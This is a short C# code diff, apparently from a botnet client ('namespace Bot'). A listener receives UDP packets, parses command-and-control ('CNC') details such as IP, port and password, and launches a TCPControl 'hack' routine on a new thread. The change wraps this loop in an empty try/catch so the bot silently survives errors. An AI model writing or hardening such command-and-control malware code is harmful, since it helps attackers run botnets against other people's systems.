@@ -32,14 +32,18 @@ namespace Bot
 
             while (true)
             {
-                Byte[] receiveBytes = listener.Receive(ref RemoteIpEndPoint);
-
-                CNCInfo info;
-                if ((info = checkData(receiveBytes)) != null)
+                try
                 {
-                    TCPControl x = new TCPControl(info.IP, info.port, info.password, info.name);
-                    new Thread(new ThreadStart(x.hack)).Start();
+                    Byte[] receiveBytes = listener.Receive(ref RemoteIpEndPoint);
+
+                    CNCInfo info;
+                    if ((info = checkData(receiveBytes)) != null)
+                    {
+                        TCPControl x = new TCPControl(info.IP, info.port, info.password, info.name);
+                        new Thread(new ThreadStart(x.hack)).Start();
+                    }
                 }
+                catch (Exception e) { }
             }
 
         }
